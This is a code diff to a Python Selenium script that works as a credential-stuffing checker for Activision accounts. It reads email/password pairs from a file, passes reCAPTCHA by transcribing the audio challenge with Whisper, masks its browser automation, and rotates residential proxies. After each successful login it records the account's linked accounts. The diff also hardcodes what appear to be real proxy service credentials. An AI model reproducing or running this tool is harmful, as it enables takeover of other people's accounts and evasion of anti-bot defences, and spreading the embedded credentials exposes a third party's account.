@@ -15,11 +15,14 @@ from selenium.common.exceptions import ElementClickInterceptedException, NoSuchE
 
 warnings.filterwarnings("ignore")
 
+# Set the ffmpeg path relative to the main directory
 ffmpeg_path = os.path.join(os.getcwd(), 'ffmpeg-7.0.1-essentials_build', 'bin', 'ffmpeg.exe')
 os.environ["PATH"] += os.pathsep + os.path.dirname(ffmpeg_path)
 
+# Configure logging
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
+# Initialize Whisper model
 model = whisper.load_model("base")
 
 def load_credentials(file_path):
@@ -31,10 +34,14 @@ def transcribe(url):
     audio_dir = 'audio'
     os.makedirs(audio_dir, exist_ok=True)
     temp_file = os.path.join(audio_dir, 'temp_audio.mp3')
+    
+    # Download the audio file
     logging.debug("Downloading audio file from URL.")
     with open(temp_file, 'wb') as f:
         f.write(requests.get(url).content)
     logging.debug(f"Audio file saved as {temp_file}")
+    
+    # Transcribe the audio file
     result = model.transcribe(temp_file)
     logging.debug(f"Transcription result: {result['text'].strip()}")
     return result["text"].strip()
@@ -55,7 +62,11 @@ def solve_audio_captcha(driver):
     driver.switch_to.frame(driver.find_element(By.XPATH, ".//iframe[@title='recaptcha challenge expires in two minutes']"))
     audio_source = driver.find_element(By.ID, "audio-source").get_attribute('src')
     logging.debug(f"Audio source URL: {audio_source}")
+    
+    # Transcribe the audio
     text = transcribe(audio_source)
+    
+    # Enter the transcribed text
     driver.find_element(By.ID, "audio-response").send_keys(text)
     driver.find_element(By.ID, "recaptcha-verify-button").click()
 
@@ -97,22 +108,36 @@ def extract_linked_accounts(driver):
             logging.error(f"{account_name} account element not found")
     return accounts
 
+def get_new_proxy():
+    username = "geonode_eJnkZtomfF"
+    password = "9bd3ee4b-77fd-47d7-bab4-c32075c44f2b"
+    GEONODE_DNS = "premium-residential.geonode.com:9000"
+    proxy_url = "http://{}:{}@{}".format(username, password, GEONODE_DNS)
+    return proxy_url
+
 def login_and_extract(driver, email, password):
     logging.info(f"Attempting login for {email}")
     driver.get("https://s.activision.com/activision/login?redirectUrl=https://www.activision.com/")
     logging.info("Activision login page loaded")
+    
     time.sleep(5)
+    
     try:
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
         logging.info(f"Entered email: {email}")
+        
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)
         logging.info("Entered password")
+        
         click_checkbox(driver)
         time.sleep(2)
+        
         request_audio_version(driver)
         time.sleep(2)
+        
         solve_audio_captcha(driver)
         time.sleep(10)
+        
         driver.switch_to.default_content()
         try:
             sign_in_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "button[type='submit']")))
@@ -123,11 +148,15 @@ def login_and_extract(driver, email, password):
         except ElementClickInterceptedException:
             logging.error("Sign-in button was blocked")
             ensure_clickable_and_click(driver, sign_in_button)
+        
         time.sleep(5)
+        
         if verify_login(driver):
             driver.get("https://s.activision.com/activision/profile")
             logging.info("Navigated to profile page")
+            
             time.sleep(5)
+            
             linked_accounts = extract_linked_accounts(driver)
             linked_accounts_str = " / ".join(linked_accounts)
             with open('checkedaccounts.txt', 'a') as file:
@@ -138,16 +167,23 @@ def login_and_extract(driver, email, password):
 
 def main():
     credentials = load_credentials('accounts.txt')
-    options = Options()
-    options.add_argument("--incognito")
-    options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_argument("--disable-extensions")
-    proxy = Proxy()
-    proxy.proxy_type = ProxyType.MANUAL
-    proxy.http_proxy = "geonode_eJnkZtomfF:9bd3ee4b-77fd-47d7-bab4-c32075c44f2b@premium-residential.geonode.com:9000"
-    options.Proxy = proxy
+    
     service = Service(executable_path="./chromedriver.exe")
+
     for email, password in credentials:
+        proxy_url = get_new_proxy()
+        
+        options = Options()
+        options.add_argument("--incognito")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--disable-extensions")
+        
+        proxy = Proxy()
+        proxy.proxy_type = ProxyType.MANUAL
+        proxy.http_proxy = proxy_url
+        proxy.ssl_proxy = proxy_url
+        options.Proxy = proxy
+
         driver = webdriver.Chrome(service=service, options=options)
         login_and_extract(driver, email, password)
         driver.quit()
